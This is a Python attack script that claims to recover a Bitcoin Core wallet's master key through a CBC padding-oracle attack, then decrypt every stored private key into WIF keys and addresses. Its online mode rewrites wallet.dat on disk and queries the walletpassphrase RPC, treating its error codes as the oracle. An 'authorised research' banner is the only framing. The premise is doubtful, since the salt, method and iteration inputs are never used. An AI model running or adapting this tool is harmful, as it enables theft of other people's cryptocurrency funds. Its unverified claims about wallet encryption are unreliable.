#!/usr/bin/env python3
"""
Bitcoin Core AES-256-CBC Padding Oracle — Master Key Recovery

Recovers the 32-byte vMasterKey from a Bitcoin Core wallet.dat through
a Vaudenay CBC padding oracle attack. No passphrase, no brute force,
no KDF — pure cryptanalysis exploiting the absence of authenticated
encryption on the mkey record.

Authorised security research only. Closed environment, own wallet.
"""

import struct, hashlib, sys, os, time, argparse, json, copy, secrets
from pathlib import Path
import http.client, base64

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
except ImportError:
    sys.exit("pip install cryptography")

# ─── Constants ────────────────────────────────────────────────────────────────

N_SECP256K1 = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
G_X = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
G_Y = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
P_FIELD = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
BLOCK_SIZE = 16
BASE58_ALPHABET = b'123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'

ORACLE_PADDING_INVALID = 0
ORACLE_KEY_INVALID     = 1
ORACLE_KEY_VALID       = 2

oracle_call_count = 0
oracle_call_times = []

# ─── Section 2: Cryptographic Primitives ──────────────────────────────────────

def aes_256_cbc_decrypt_raw(key_32, iv_16, ciphertext):
    """Raw AES-256-CBC decryption. Returns decrypted bytes WITH padding intact.
    Returns None on any error."""
    try:
        if len(key_32) != 32 or len(iv_16) != 16:
            return None
        if len(ciphertext) == 0 or len(ciphertext) % 16 != 0:
            return None
        cipher = Cipher(algorithms.AES(key_32), modes.CBC(iv_16), backend=default_backend())
        dec = cipher.decryptor()
        raw = dec.update(ciphertext) + dec.finalize()
        return raw
    except Exception:
        return None


def aes_256_cbc_encrypt_raw(key_32, iv_16, plaintext):
    """Raw AES-256-CBC encryption. Plaintext must already be padded to block boundary."""
    try:
        if len(key_32) != 32 or len(iv_16) != 16:
            return None
        if len(plaintext) == 0 or len(plaintext) % 16 != 0:
            return None
        cipher = Cipher(algorithms.AES(key_32), modes.CBC(iv_16), backend=default_backend())
        enc = cipher.encryptor()
        ct = enc.update(plaintext) + enc.finalize()
        return ct
    except Exception:
        return None


def pkcs7_check_padding(data):
    """Returns True if data has valid PKCS7 padding (1 <= N <= 16, last N bytes all == N)."""
    if not data or len(data) == 0:
        return False
    n = data[-1]
    if n < 1 or n > 16:
        return False
    if len(data) < n:
        return False
    for i in range(n):
        if data[-(i + 1)] != n:
            return False
    return True


def pkcs7_strip(data):
    """Strips valid PKCS7 padding. Returns unpadded bytes or None if invalid."""
    if not pkcs7_check_padding(data):
        return None
    n = data[-1]
    return data[:-n]


def is_valid_secp256k1_privkey(data):
    """Returns True if data is a valid 32-byte secp256k1 private key."""
    if len(data) != 32:
        return False
    val = int.from_bytes(data, 'big')
    return 0 < val < N_SECP256K1


def _modinv(a, m):
    """Modular inverse using extended Euclidean algorithm."""
    if a < 0:
        a = a % m
    g, x, _ = _extended_gcd(a, m)
    if g != 1:
        return None
    return x % m


def _extended_gcd(a, b):
    """Extended GCD: returns (gcd, x, y) such that a*x + b*y = gcd."""
    if a == 0:
        return b, 0, 1
    g, x1, y1 = _extended_gcd(b % a, a)
    x = y1 - (b // a) * x1
    y = x1
    return g, x, y


def _point_add(P, Q):
    """Add two points on secp256k1. Points are (x, y) tuples or None (infinity)."""
    if P is None:
        return Q
    if Q is None:
        return P
    px, py = P
    qx, qy = Q
    if px == qx and py == qy:
        # Point doubling
        if py == 0:
            return None
        num = (3 * px * px) % P_FIELD
        den = (2 * py) % P_FIELD
        lam = (num * _modinv(den, P_FIELD)) % P_FIELD
    elif px == qx:
        # Vertical line — point at infinity
        return None
    else:
        num = (qy - py) % P_FIELD
        den = (qx - px) % P_FIELD
        lam = (num * _modinv(den, P_FIELD)) % P_FIELD
    rx = (lam * lam - px - qx) % P_FIELD
    ry = (lam * (px - rx) - py) % P_FIELD
    return (rx, ry)


def _scalar_mul(k, P):
    """Scalar multiplication on secp256k1 using double-and-add.
    Returns compressed public key as 33 bytes."""
    result = None
    addend = P
    n = k
    while n > 0:
        if n & 1:
            result = _point_add(result, addend)
        addend = _point_add(addend, addend)
        n >>= 1
    if result is None:
        return None
    x_bytes = result[0].to_bytes(32, 'big')
    prefix = b'\x02' if result[1] % 2 == 0 else b'\x03'
    return prefix + x_bytes


def privkey_to_compressed_pubkey(privkey_bytes):
    """Compute compressed public key from 32-byte private key."""
    try:
        k = int.from_bytes(privkey_bytes, 'big')
        if k <= 0 or k >= N_SECP256K1:
            return None
        return _scalar_mul(k, (G_X, G_Y))
    except Exception:
        return None


def hash160(data):
    """RIPEMD160(SHA256(data))."""
    return hashlib.new('ripemd160', hashlib.sha256(data).digest()).digest()


def base58check_encode(payload):
    """Full Base58Check encoding with 4-byte checksum."""
    checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    data = payload + checksum
    # Count leading zero bytes
    leading_zeros = 0
    for b in payload:
        if b == 0:
            leading_zeros += 1
        else:
            break
    # Convert to big integer
    n = int.from_bytes(data, 'big')
    chars = []
    while n > 0:
        n, remainder = divmod(n, 58)
        chars.append(BASE58_ALPHABET[remainder:remainder + 1])
    chars.reverse()
    result = b'1' * leading_zeros + b''.join(chars)
    return result.decode('ascii')


def privkey_to_wif(privkey_bytes, compressed=True):
    """WIF encoding of a private key."""
    payload = b'\x80' + privkey_bytes
    if compressed:
        payload += b'\x01'
    return base58check_encode(payload)


def privkey_to_p2pkh_address(privkey_bytes):
    """Derive P2PKH address from private key bytes."""
    pubkey = privkey_to_compressed_pubkey(privkey_bytes)
    if pubkey is None:
        return None
    h = hash160(pubkey)
    payload = b'\x00' + h
    return base58check_encode(payload)


# ─── Section 3: Oracle Implementations ───────────────────────────────────────

def oracle_demo(modified_ciphertext, demo_key):
    """Demo oracle: decrypts modified_ciphertext with demo_key, checks PKCS7 padding.
    Returns ORACLE_PADDING_INVALID, ORACLE_KEY_INVALID, or ORACLE_KEY_VALID."""
    global oracle_call_count, oracle_call_times
    t0 = time.time()

    if len(modified_ciphertext) < 32 or len(modified_ciphertext) % BLOCK_SIZE != 0:
        oracle_call_count += 1
        oracle_call_times.append(time.time() - t0)
        return ORACLE_PADDING_INVALID

    iv = modified_ciphertext[:16]
    ct = modified_ciphertext[16:]

    raw = aes_256_cbc_decrypt_raw(demo_key, iv, ct)
    if raw is None:
        oracle_call_count += 1
        oracle_call_times.append(time.time() - t0)
        return ORACLE_PADDING_INVALID

    if not pkcs7_check_padding(raw):
        oracle_call_count += 1
        oracle_call_times.append(time.time() - t0)
        return ORACLE_PADDING_INVALID

    # Padding valid — check if the unpadded content is a valid secp256k1 key
    stripped = pkcs7_strip(raw)
    if stripped is not None and len(stripped) >= 32 and is_valid_secp256k1_privkey(stripped[:32]):
        oracle_call_count += 1
        oracle_call_times.append(time.time() - t0)
        return ORACLE_KEY_VALID

    oracle_call_count += 1
    oracle_call_times.append(time.time() - t0)
    return ORACLE_KEY_INVALID


def call_walletpassphrase_rpc(host, port, user, password, passphrase, timeout=5):
    """Call walletpassphrase via JSON-RPC. Returns 0 on success, error code on failure, -99 on connection error."""
    global oracle_call_count
    try:
        conn = http.client.HTTPConnection(host, port, timeout=timeout)
        payload = json.dumps({
            "jsonrpc": "1.0",
            "id": oracle_call_count,
            "method": "walletpassphrase",
            "params": [passphrase, 1]
        })
        auth_str = base64.b64encode(f"{user}:{password}".encode()).decode()
        headers = {
            "Content-Type": "application/json",
            "Authorization": f"Basic {auth_str}"
        }
        conn.request("POST", "/", payload, headers)
        resp = conn.getresponse()
        body = resp.read().decode('utf-8', errors='replace')
        conn.close()

        if resp.status == 200:
            data = json.loads(body)
            if data.get("error") is None:
                return 0
            return data["error"].get("code", -99)
        else:
            try:
                data = json.loads(body)
                if "error" in data and data["error"] is not None:
                    return data["error"].get("code", -99)
            except (json.JSONDecodeError, KeyError):
                return -99
            return -99
    except Exception:
        return -99


def inject_modified_ciphertext(wallet_bytes, new_ciphertext):
    """Locate mkey record in BDB wallet bytes and replace vchCryptedKey field.
    Returns modified wallet bytes or None if pattern not found."""
    marker = b'\x04mkey'
    pos = wallet_bytes.find(marker)
    if pos == -1:
        return None

    data = bytearray(wallet_bytes)
    ct_len = len(new_ciphertext)
    search_start = pos + len(marker)
    search_end = min(search_start + 800, len(data))

    for i in range(search_start, search_end):
        if data[i] == ct_len:
            # Check if the bytes following look like ciphertext (non-trivial check:
            # we just verify we have enough room)
            if i + 1 + ct_len <= len(data):
                data[i + 1: i + 1 + ct_len] = new_ciphertext
                return bytes(data)

    return None


def oracle_online(modified_ciphertext, wallet_dat_path, rpc_host, rpc_port,
                  rpc_user, rpc_pass, salt, method, iterations, verbose=False):
    """Real wallet oracle: modifies wallet.dat, calls walletpassphrase RPC,
    observes error code, restores wallet.dat."""
    global oracle_call_count, oracle_call_times
    t0 = time.time()

    original_bytes = Path(wallet_dat_path).read_bytes()

    modified_wallet_bytes = inject_modified_ciphertext(original_bytes, modified_ciphertext)
    if modified_wallet_bytes is None:
        raise RuntimeError(
            f"Failed to locate mkey record in {wallet_dat_path}. "
            "The wallet.dat may not contain a recognisable mkey structure, "
            "or the ciphertext length does not match any CompactSize field."
        )

    Path(wallet_dat_path).write_bytes(modified_wallet_bytes)

    try:
        passphrase = f"oracle_{oracle_call_count}"
        error_code = call_walletpassphrase_rpc(
            rpc_host, rpc_port, rpc_user, rpc_pass, passphrase
        )
    finally:
        Path(wallet_dat_path).write_bytes(original_bytes)

    if error_code == -8:
        result = ORACLE_PADDING_INVALID
    elif error_code == -14:
        result = ORACLE_KEY_INVALID
    elif error_code == 0:
        result = ORACLE_KEY_VALID
    else:
        result = ORACLE_PADDING_INVALID

    elapsed = time.time() - t0
    oracle_call_count += 1
    oracle_call_times.append(elapsed)

    if verbose:
        print(f"    [oracle] call #{oracle_call_count}  error_code={error_code}  "
              f"result={result}  elapsed={elapsed*1000:.1f}ms")

    return result


# ─── Section 4: Vaudenay Attack Core ─────────────────────────────────────────

def vaudenay_attack(ciphertext, oracle_fn, verbose=True):
    """Full Vaudenay CBC padding oracle attack.
    Recovers plaintext from AES-256-CBC ciphertext using an oracle that
    distinguishes valid from invalid PKCS7 padding."""

    if len(ciphertext) < 32:
        raise ValueError(
            f"Ciphertext too short: {len(ciphertext)} bytes. "
            f"Minimum is 32 bytes (IV + 1 block)."
        )
    if len(ciphertext) % BLOCK_SIZE != 0:
        raise ValueError(
            f"Ciphertext length {len(ciphertext)} is not a multiple of "
            f"block size {BLOCK_SIZE}."
        )

    num_blocks = len(ciphertext) // BLOCK_SIZE
    total_target_blocks = num_blocks - 1
    total_bytes = total_target_blocks * BLOCK_SIZE
    recovered_all = bytearray()
    bytes_done = 0
    attack_start = time.time()

    print(f"\n[*] Ciphertext: {len(ciphertext)} bytes = {num_blocks} blocks")
    print(f"[*] Attacking {total_target_blocks} target block(s) = {total_bytes} plaintext bytes")
    print(f"[*] Estimated oracle queries: ~{total_bytes * 128} (avg 128/byte)\n")

    for block_idx in range(1, num_blocks):
        target_block = ciphertext[block_idx * 16 : (block_idx + 1) * 16]
        prev_block = ciphertext[(block_idx - 1) * 16 : block_idx * 16]
        intermediate = bytearray(16)
        recovered = bytearray(16)

        if verbose:
            print(f"\n── Block {block_idx}/{total_target_blocks} ──")

        for byte_pos in range(15, -1, -1):
            padding_val = 16 - byte_pos
            found = False

            for candidate in range(256):
                mod_prev = bytearray(16)

                # Positions before byte_pos: copy from prev_block unchanged
                for j in range(byte_pos):
                    mod_prev[j] = prev_block[j]

                # Position byte_pos: set to candidate
                mod_prev[byte_pos] = candidate

                # Positions after byte_pos: set to produce correct padding
                for j in range(byte_pos + 1, 16):
                    mod_prev[j] = intermediate[j] ^ padding_val

                probe = bytes(mod_prev) + target_block
                result = oracle_fn(probe)

                if result != ORACLE_PADDING_INVALID:
                    # False positive check for last byte
                    if byte_pos == 15:
                        verify_prev = bytearray(mod_prev)
                        verify_prev[14] ^= 0xFF
                        verify_probe = bytes(verify_prev) + target_block
                        verify_result = oracle_fn(verify_probe)
                        if verify_result == ORACLE_PADDING_INVALID:
                            continue  # False positive — skip

                    intermediate[byte_pos] = candidate ^ padding_val
                    recovered[byte_pos] = intermediate[byte_pos] ^ prev_block[byte_pos]

                    if verbose:
                        ch = chr(recovered[byte_pos]) if 32 <= recovered[byte_pos] < 127 else '.'
                        print(f"    byte[{byte_pos:2d}] = 0x{recovered[byte_pos]:02x} "
                              f"'{ch}'  candidate=0x{candidate:02x}  "
                              f"queries={oracle_call_count}")

                    found = True
                    break

            if not found:
                print(f"    [!] WARNING: No valid candidate for block {block_idx} "
                      f"byte {byte_pos}. Setting to 0x00.")
                recovered[byte_pos] = 0x00

            bytes_done += 1

            # Progress bar every 4 bytes
            if bytes_done % 4 == 0 or bytes_done == total_bytes:
                pct = bytes_done / total_bytes
                bar_len = 32
                filled = int(bar_len * pct)
                bar = '█' * filled + '░' * (bar_len - filled)
                elapsed = time.time() - attack_start
                if bytes_done > 0 and elapsed > 0:
                    qps = oracle_call_count / elapsed
                    remaining_bytes = total_bytes - bytes_done
                    est_remaining_q = remaining_bytes * (oracle_call_count / bytes_done)
                    est_remaining_s = est_remaining_q / qps if qps > 0 else 0
                else:
                    est_remaining_s = 0
                print(f"  [{bar}] {bytes_done}/{total_bytes} bytes  "
                      f"queries={oracle_call_count}  "
                      f"ETA={est_remaining_s:.0f}s", flush=True)

        recovered_all.extend(recovered)

    total_time = time.time() - attack_start
    print(f"\n[*] Attack complete: {oracle_call_count} oracle queries in {total_time:.2f}s")
    if oracle_call_count > 0:
        print(f"[*] Average: {oracle_call_count / total_bytes:.1f} queries/byte, "
              f"{total_time / oracle_call_count * 1000:.2f} ms/query")

    return bytes(recovered_all)


# ─── Section 5: Post-Recovery ckey Decryption ────────────────────────────────

def decrypt_ckeys_with_master(vmaster_key, ckey_records, verbose=True):
    """Decrypt all ckey records using the recovered master key."""
    results = []
    valid_count = 0

    for idx, rec in enumerate(ckey_records):
        pubkey = bytes.fromhex(rec["pubkey"]) if isinstance(rec["pubkey"], str) else rec["pubkey"]
        enc_privkey = bytes.fromhex(rec["encrypted_privkey"]) if isinstance(rec["encrypted_privkey"], str) else rec["encrypted_privkey"]

        # Bitcoin Core IV derivation: SHA256(SHA256(pubkey))[:16]
        iv = hashlib.sha256(hashlib.sha256(pubkey).digest()).digest()[:16]

        raw = aes_256_cbc_decrypt_raw(vmaster_key, iv, enc_privkey)
        if raw is None:
            results.append({
                "pubkey_hex": pubkey.hex(),
                "error": "decrypt_failed",
                "valid": False
            })
            if verbose:
                print(f"  [-] ckey #{idx}: decryption failed")
            continue

        if not pkcs7_check_padding(raw):
            results.append({
                "pubkey_hex": pubkey.hex(),
                "error": "padding_invalid",
                "valid": False
            })
            if verbose:
                print(f"  [-] ckey #{idx}: invalid PKCS7 padding after decryption")
            continue

        unpadded = pkcs7_strip(raw)
        if unpadded is None:
            results.append({
                "pubkey_hex": pubkey.hex(),
                "error": "strip_failed",
                "valid": False
            })
            continue

        # Extract 32-byte private key
        privkey = None
        if len(unpadded) == 34 and unpadded[0] == 0x04 and unpadded[1] == 0x20:
            privkey = unpadded[2:34]
        elif len(unpadded) >= 32:
            privkey = unpadded[-32:]
        else:
            results.append({
                "pubkey_hex": pubkey.hex(),
                "error": f"bad_length_{len(unpadded)}",
                "valid": False
            })
            if verbose:
                print(f"  [-] ckey #{idx}: unexpected unpadded length {len(unpadded)}")
            continue

        if not is_valid_secp256k1_privkey(privkey):
            results.append({
                "pubkey_hex": pubkey.hex(),
                "privkey_hex": privkey.hex(),
                "error": "invalid_secp256k1_key",
                "valid": False
            })
            if verbose:
                print(f"  [-] ckey #{idx}: not a valid secp256k1 private key")
            continue

        wif = privkey_to_wif(privkey)
        address = privkey_to_p2pkh_address(privkey)

        results.append({
            "pubkey_hex": pubkey.hex(),
            "privkey_hex": privkey.hex(),
            "wif": wif,
            "address": address,
            "valid": True
        })
        valid_count += 1

        if verbose:
            print(f"  [+] {address} — {wif}")

    print(f"\n[*] {valid_count}/{len(ckey_records)} valid private keys recovered")

    if valid_count == 0 and len(ckey_records) > 0:
        print("\n[!] DIAGNOSTIC: Zero valid keys recovered. Most likely causes:")
        print("    1. The oracle attack recovered intermediate bytes but the XOR step")
        print("       used the wrong previous ciphertext block")
        print("    2. The ckey IV derivation (SHA256d of pubkey) does not match this")
        print("       version of Bitcoin Core")
        print("    3. The recovered master key has corrupted bytes due to oracle")
        print("       false positives during the attack")

    return results


# ─── Section 6: Demo Mode ────────────────────────────────────────────────────

def run_demo_mode(verbose=True):
    """Self-contained demonstration of the Vaudenay padding oracle attack.
    Generates a random key, encrypts a random 32-byte plaintext, then
    recovers it using the oracle attack to prove algorithmic correctness."""
    global oracle_call_count, oracle_call_times
    oracle_call_count = 0
    oracle_call_times = []

    print("\n[*] DEMO MODE — Self-contained proof of algorithm correctness")
    print("[*] Generating random key, plaintext, and IV...\n")

    K_demo = secrets.token_bytes(32)
    plaintext_32 = secrets.token_bytes(32)

    # PKCS7 pad to 48 bytes: 32 bytes data + 16 bytes of 0x10
    plaintext_padded = plaintext_32 + bytes([0x10] * 16)

    iv_demo = secrets.token_bytes(16)

    # Encrypt
    demo_ct = aes_256_cbc_encrypt_raw(K_demo, iv_demo, plaintext_padded)
    if demo_ct is None:
        print("[-] FATAL: Encryption failed in demo setup")
        sys.exit(1)

    # Full ciphertext = IV || C1 || C2 (48 bytes total)
    full_ciphertext = iv_demo + demo_ct

    print(f"  Demo key:        {K_demo.hex()}")
    print(f"  Plaintext (32B): {plaintext_32.hex()}")
    print(f"  IV:              {iv_demo.hex()}")
    print(f"  Ciphertext:      {full_ciphertext.hex()}")
    print(f"  Total CT length: {len(full_ciphertext)} bytes ({len(full_ciphertext)//16} blocks)")

    # Verify encryption/decryption round-trip
    verify = aes_256_cbc_decrypt_raw(K_demo, iv_demo, demo_ct)
    if verify is None or verify != plaintext_padded:
        print("[-] FATAL: Encryption/decryption round-trip failed")
        sys.exit(1)
    print(f"  Round-trip:      VERIFIED\n")

    demo_oracle = lambda ct: oracle_demo(ct, K_demo)

    t_start = time.time()
    recovered = vaudenay_attack(full_ciphertext, demo_oracle, verbose=verbose)
    t_elapsed = time.time() - t_start

    recovered_key = recovered[:32]
    recovered_pad = recovered[32:]

    print(f"\n{'='*60}")
    print(f"  Original plaintext:  {plaintext_32.hex()}")
    print(f"  Recovered plaintext: {recovered_key.hex()}")
    print(f"  Recovered padding:   {recovered_pad.hex()}")
    print(f"{'='*60}")

    if recovered_key == plaintext_32:
        print(f"\n[+] DEMO SUCCESSFUL: recovered == original plaintext")
        print(f"[+] Oracle queries:  {oracle_call_count}")
        print(f"[+] Total time:      {t_elapsed:.2f}s")
        if oracle_call_count > 0:
            avg_per_byte = oracle_call_count / 32
            avg_ms = (t_elapsed / oracle_call_count) * 1000
            print(f"[+] Avg queries/byte: {avg_per_byte:.1f}")
            print(f"[+] Avg ms/query:     {avg_ms:.3f}")

        # Verify padding block too
        expected_pad = bytes([0x10] * 16)
        if recovered_pad == expected_pad:
            print(f"[+] Padding block:   CORRECT (16 × 0x10)")
        else:
            print(f"[!] Padding block:   MISMATCH (expected {expected_pad.hex()}, "
                  f"got {recovered_pad.hex()})")
    else:
        # Find first mismatch
        mismatches = []
        for i in range(32):
            if recovered_key[i] != plaintext_32[i]:
                mismatches.append(i)
        print(f"\n[-] DEMO FAILED: mismatch at byte(s) {mismatches}")
        print(f"    Expected: {plaintext_32.hex()}")
        print(f"    Got:      {recovered_key.hex()}")
        sys.exit(1)


# ─── Section 7: Main Orchestration ───────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Bitcoin Core AES-256-CBC Padding Oracle — Master Key Recovery",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --mode demo --verbose
  %(prog)s --mode online --ciphertext-hex AABB...  --wallet-dat /path/to/wallet.dat
        """
    )
    parser.add_argument("--mode", choices=["online", "demo"], default="online",
                        help="Attack mode: 'demo' for self-test, 'online' for real wallet (default: online)")
    parser.add_argument("--ciphertext-hex", type=str, default=None,
                        help="48-byte vchCryptedKey as hex string (96 hex chars, required for online)")
    parser.add_argument("--wallet-dat", type=str, default=None,
                        help="Path to wallet.dat (must be writable, required for online)")
    parser.add_argument("--host", type=str, default="127.0.0.1",
                        help="RPC host (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=8332,
                        help="RPC port (default: 8332)")
    parser.add_argument("--rpc-user", type=str, default="user",
                        help="RPC username (default: user)")
    parser.add_argument("--rpc-pass", type=str, default="pass",
                        help="RPC password (default: pass)")
    parser.add_argument("--salt-hex", type=str, default=None,
                        help="vchSalt as hex string (8 bytes / 16 hex chars)")
    parser.add_argument("--method", type=int, default=0,
                        help="nDerivationMethod: 0=EVP_BytesToKey, 1=PBKDF2 (default: 0)")
    parser.add_argument("--iterations", type=int, default=25000,
                        help="nDeriveIterations (default: 25000)")
    parser.add_argument("--ckeys-json", type=str, default=None,
                        help="JSON file with ckey records for post-recovery decryption")
    parser.add_argument("--verbose", action="store_true",
                        help="Print per-byte oracle responses")
    parser.add_argument("--output-json", type=str, default="oracle_results.json",
                        help="Output JSON report path (default: oracle_results.json)")

    args = parser.parse_args()

    # Banner
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║  Bitcoin Core AES-256-CBC Padding Oracle — Master Key Recovery")
    print("║  AUTHORISED SECURITY RESEARCH ONLY")
    print("║  Closed environment — own wallet — Bitcoin Core security team")
    print("╚══════════════════════════════════════════════════════════════╝")

    if args.mode == "demo":
        print(f"Mode: demo")
        print(f"Self-contained proof of algorithm correctness")
        run_demo_mode(verbose=args.verbose)
        sys.exit(0)

    # ── Online mode ──
    print(f"Mode: online")

    if args.ciphertext_hex is None:
        print("[-] ERROR: --ciphertext-hex is required for online mode")
        sys.exit(1)

    ct_hex = args.ciphertext_hex.strip()
    if len(ct_hex) != 96:
        print(f"[-] ERROR: --ciphertext-hex must be 96 hex chars (48 bytes), got {len(ct_hex)}")
        sys.exit(1)

    try:
        ciphertext = bytes.fromhex(ct_hex)
    except ValueError as e:
        print(f"[-] ERROR: Invalid hex in --ciphertext-hex: {e}")
        sys.exit(1)

    if args.wallet_dat is None:
        print("[-] ERROR: --wallet-dat is required for online mode")
        sys.exit(1)

    wallet_path = Path(args.wallet_dat)
    if not wallet_path.exists():
        print(f"[-] ERROR: {args.wallet_dat} does not exist")
        sys.exit(1)
    if not os.access(args.wallet_dat, os.W_OK):
        print(f"[-] ERROR: {args.wallet_dat} is not writable")
        sys.exit(1)

    num_blocks = len(ciphertext) // BLOCK_SIZE
    est_queries = (num_blocks - 1) * BLOCK_SIZE * 128

    print(f"Ciphertext: {ct_hex[:16]}...{ct_hex[-16:]}  Blocks: {num_blocks}  Est. queries: ~{est_queries}")
    print(f"RPC: {args.rpc_user}@{args.host}:{args.port}")
    print()
    print("[*] Attack strategy:")
    print("    1. Modify vchCryptedKey bytes directly in wallet.dat on disk")
    print("    2. Call walletpassphrase RPC (passphrase value is irrelevant)")
    print("    3. Observe error code: -8 = padding invalid, -14 = padding valid")
    print("    4. Restore wallet.dat immediately after each query")
    print("    5. Recover master key byte-by-byte via Vaudenay CBC attack")
    print()

    salt = bytes.fromhex(args.salt_hex) if args.salt_hex else b'\x00' * 8

    def oracle_fn(modified_ct):
        return oracle_online(
            modified_ct, args.wallet_dat,
            args.host, args.port, args.rpc_user, args.rpc_pass,
            salt, args.method, args.iterations,
            verbose=args.verbose
        )

    global oracle_call_count, oracle_call_times
    oracle_call_count = 0
    oracle_call_times = []

    t_start = time.time()
    recovered = vaudenay_attack(ciphertext, oracle_fn, verbose=args.verbose)
    t_elapsed = time.time() - t_start

    master_key = recovered[:32]
    padding_bytes = recovered[32:] if len(recovered) > 32 else b''

    print(f"\n{'='*60}")
    print(f"  Recovered master key: {master_key.hex()}")
    if padding_bytes:
        print(f"  Padding bytes:        {padding_bytes.hex()}")
    print(f"  Oracle queries:       {oracle_call_count}")
    print(f"  Elapsed:              {t_elapsed:.2f}s")
    print(f"{'='*60}")

    # Post-recovery ckey decryption
    decrypted_keys = []
    if args.ckeys_json:
        ckeys_path = Path(args.ckeys_json)
        if ckeys_path.exists():
            with open(ckeys_path, 'r') as f:
                ckey_records = json.load(f)
            print(f"\n[*] Decrypting {len(ckey_records)} ckey record(s) with recovered master key...")
            decrypted_keys = decrypt_ckeys_with_master(master_key, ckey_records, verbose=args.verbose)
        else:
            print(f"[!] WARNING: {args.ckeys_json} not found, skipping ckey decryption")

    # Write JSON report
    avg_ms = (sum(oracle_call_times) / len(oracle_call_times) * 1000) if oracle_call_times else 0
    report = {
        "mode": "online",
        "ciphertext_hex": ct_hex,
        "oracle_calls": oracle_call_count,
        "elapsed_seconds": round(t_elapsed, 3),
        "avg_query_ms": round(avg_ms, 3),
        "recovered_hex": recovered.hex(),
        "master_key_hex": master_key.hex(),
        "decrypted_keys": decrypted_keys
    }

    output_path = args.output_json
    with open(output_path, 'w') as f:
        json.dump(report, f, indent=2)
    print(f"\n[*] Report written to {output_path}")


if __name__ == "__main__":
    main()
